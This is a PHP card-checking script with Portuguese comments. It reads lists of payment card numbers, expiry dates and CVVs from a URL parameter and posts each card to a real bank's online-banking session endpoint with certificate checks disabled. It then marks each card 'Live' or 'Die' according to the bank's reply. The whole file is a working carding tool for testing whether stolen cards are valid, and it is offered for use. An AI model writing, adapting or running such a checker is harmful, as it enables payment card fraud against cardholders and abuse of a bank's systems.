<?php 
/////////////// CODADO PELO @GREENCASH19 
//////////////  INDEX NÃO É MINHA SÓ API :)
////////////// PRIMEIRO COMANDO DA WEB KRL SÓ VEM....
error_reporting(0);
set_time_limit(0);
///// Pegando parametros via GET
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$numero = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
/// Dar um replace no ano exemplo 2020 para 20
If(strlen($ano) > 2)
{
  $ano = substr($ano,2,3);
}
/// Verificando parametros vazios.
if(strpos($lista, '|')){
/// Função curl começo
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.cibconline.cibc.com/ebm-anp/api/v1/json/sessions");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: www.cibconline.cibc.com',
'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
'Accept: application/vnd.api+json',
'Accept-Language: en',
'Accept-Encoding: gzip, deflate, br',
'Content-Type: application/vnd.api+json',
'Client-Type: default_web',
'X-Auth-Token: null',
'brand: cibc',
'WWW-Authenticate: CardAndExpiryDate',
'X-Requested-With: XMLHttpRequest',
'Referer: https://www.cibconline.cibc.com/ebm-resources/public/banking/cibc/client/web/index.html',
'Connection: keep-alive'
    ));
     curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"card":{"value":"'.$numero.'","description":"","encrypted":"false","encrypt":"true"},"expiryDate":{"year":"'.$ano.'","month":"'.$mes.'"},"txType":"REGIST"}');
/// Término funçao curl

/// Executa curl
$data = curl_exec($ch);

/// Verifica se deu live ou die
if (strpos($data, 'problems')) { 
  echo '<font color="red" style="font-size: 15px">Die ➜ '.$lista.' #L4MMER<br></font>';
  }
  else if (strpos($data, 'transactionId')){
  echo '<font color="lime" style="font-size: 15px">Live ➜ '.$lista.' #L4MMER<br></font>';
}
else{
    echo '<font color="red" style="font-size: 15px"><br></font>';
}
}
ob_flush();
///// FIM.... kskljsdkdskkhkjjd
 ?>
